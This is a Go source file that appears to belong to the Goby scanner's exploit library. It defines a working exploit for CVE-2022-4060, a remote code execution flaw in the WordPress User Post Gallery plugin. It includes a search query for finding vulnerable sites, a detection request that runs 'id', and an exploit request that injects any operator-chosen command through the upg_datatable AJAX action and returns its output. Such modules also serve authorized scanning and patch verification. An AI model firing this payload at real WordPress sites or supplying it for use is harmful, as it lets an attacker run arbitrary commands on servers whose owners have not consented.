package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "WordPress plugins User Post Gallery upg_datatable RCE Vulnerability (CVE-2022-4060)",
    "Description": "<p>WordPress plugins User Post Gallery is a plugin that allows users to select albums, generate tags, upload pictures and videos from the front end.</p><p>There is a code injection vulnerability in WordPress plugin User Post Gallery 2.19 and earlier versions. The vulnerability stems from the fact that the callback function allows any user to call it. Attackers can use this vulnerability to run code on its site.</p>",
    "Product": "WordPress-plugins-User-Post-Gallery",
    "Homepage": "https://wordpress.org/plugins/wp-upg/",
    "DisclosureDate": "2023-01-30",
    "Author": "corp0ra1",
    "FofaQuery": "body=\"wp-content/plugins/wp-upg\"",
    "GobyQuery": "body=\"wp-content/plugins/wp-upg\"",
    "Level": "3",
    "Impact": "<p>There is a code injection vulnerability in WordPress plugin User Post Gallery 2.19 and earlier versions. The vulnerability stems from the fact that the callback function allows any user to call it. Attackers can use this vulnerability to run code on its site.</p>",
    "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch is: <a href=\"https://wordpress.org/plugins/wp-upg/.\">https://wordpress.org/plugins/wp-upg/.</a></p>",
    "References": [
        "https://wpscan.com/vulnerability/8f982ebd-6fc5-452d-8280-42e027d01b1e"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "id",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/wp-admin/admin-ajax.php?action=upg_datatable&field=field:exec:id:NULL:NULL",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "recordsTotal",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "recordsFiltered",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "uid=",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "gid=",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/wp-admin/admin-ajax.php?action=upg_datatable&field=field:exec:{{{cmd}}}:NULL:NULL",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "recordsTotal",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        "CVE-2022-4060"
    ],
    "CNNVD": [
        "CNNVD-202301-1233"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "WordPress User Post Gallery 插件 upg_datatable 远程代码执行漏洞（CVE-2022-4060）",
            "Product": "WordPress-plugins-User-Post-Gallery",
            "Description": "<p>WordPress plugins User Post Gallery 是一款让用户从前端选择相册、生成标签、上传图片、视频的插件。<br></p><p>WordPress plugin User Post Gallery 2.19及之前版本存在代码注入漏洞，该漏洞源于callback函数允许任意用户调用，攻击者利用该漏洞可以在它的站点上运行代码。<br></p>",
            "Recommendation": "<p>目前厂商已发布升级补丁以修复漏洞，补丁获取链接：<a href=\"https://wordpress.org/plugins/wp-upg/\">https://wordpress.org/plugins/wp-upg/</a>。<br></p>",
            "Impact": "<p>WordPress plugin User Post Gallery 2.19及之前版本存在代码注入漏洞，该漏洞源于callback函数允许任意用户调用，攻击者利用该漏洞可以在它的站点上运行代码。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "WordPress plugins User Post Gallery upg_datatable RCE Vulnerability (CVE-2022-4060)",
            "Product": "WordPress-plugins-User-Post-Gallery",
            "Description": "<p>WordPress plugins User Post Gallery is a plugin that allows users to select albums, generate tags, upload pictures and videos from the front end.<br></p><p>There is a code injection vulnerability in WordPress plugin User Post Gallery 2.19 and earlier versions. The vulnerability stems from the fact that the callback function allows any user to call it. Attackers can use this vulnerability to run code on its site.<br></p>",
            "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch is: <a href=\"https://wordpress.org/plugins/wp-upg/.\">https://wordpress.org/plugins/wp-upg/.</a><br></p>",
            "Impact": "<p>There is a code injection vulnerability in WordPress plugin User Post Gallery 2.19 and earlier versions. The vulnerability stems from the fact that the callback function allows any user to call it. Attackers can use this vulnerability to run code on its site.<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10796"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}